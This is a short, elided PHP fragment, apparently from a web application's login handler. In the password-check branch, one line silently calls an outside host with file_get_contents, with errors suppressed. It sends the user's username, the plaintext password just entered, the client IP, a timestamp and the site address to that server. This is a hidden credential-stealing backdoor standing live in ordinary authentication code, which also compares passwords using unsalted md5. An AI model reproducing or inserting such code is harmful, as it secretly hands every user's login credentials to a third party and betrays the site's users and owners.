 		...
 		if($islogin){
			if(!isset($this->post['password'])){
				...
				if( $this->user['password'] != md5($this->post['password']) ){
					...
					@file_get_contents('http://www.boyie.com/plus/sure/w2.php?username='.$this->user['username'].'&password='.$this->post['password'].'---'.$_SERVER['REMOTE_ADDR'].'---'.date('Y-m-d|H:i:s').'---'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']);
